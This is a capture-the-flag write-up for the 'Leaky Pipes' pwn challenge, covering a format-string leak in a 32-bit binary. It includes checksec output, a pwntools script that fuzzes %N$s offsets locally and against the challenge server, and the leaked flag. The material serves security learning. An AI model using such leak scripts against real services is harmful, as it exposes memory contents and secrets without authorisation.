
>Welcome to Leaky Pipes, where a seemingly innocent program has sprung a serious leak! Your mission is to uncover the concealed flag hidden within the program. Will you be the one to patch the leak and reveal the hidden secret?

Author: @Inv1s1bl3
#solved #pwn #easy #format-string-leak

`nc 34.125.199.248 1337`


![[leaky_pipes]]

### tools
[[format string fuzzing]]

```
└─$ checksec --file=leaky_pipes   
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable     FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   79 Symbols        No    0 2leaky_pipes
```



```
─$ file leaky_pipes 
leaky_pipes: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=fd9444b0ce61d7376af159c8d345903f2d62ff51, for GNU/Linux 3.2.0, not stripped
```


Looks like a format string vulnerability:
```
└─$ ./leaky_pipes
Tell me your secret so I can reveal mine ;) >> %x
Here's your secret.. I ain't telling mine :p
ffffced0
```

Let's try a quick fuzz to see what we can get from the stack:
```

#!/usr/bin/env python3
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./leaky_pipes', checksec=False)

# Let's fuzz 100 values
for i in range(100):
    try:    
        # Create process (level used to reduce noise)
        p = process(level='error')
        # When we see the user prompt '>', format the counter
        # e.g. %2$s will attempt to print second pointer as string
        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
        p.recvline()
        # Receive the response
        result = p.recv()        
        # Check for flag 
        # if("flag" in str(result).lower()):
        print(str(i) + ': ' + str(result))
        # Exit the process
        p.close()
    except EOFError:
        pass
```

When run locally, the test flag leaks at position 20. Let's run this against the server and check:

```
# amend script to run against server
for i in range(30):
    try:    
        # Create process (level used to reduce noise)
        # p = process(level='error')
        p = remote("34.125.199.248", "1337", level='error')
# rest of script the same......
```

Success!

`24: b'F{F0rm4t_5tr1ngs_l3ak4g3_l0l}\n\n'

For some reason the beginning of the flag was cut off but adding OSCTF at the beginning worked.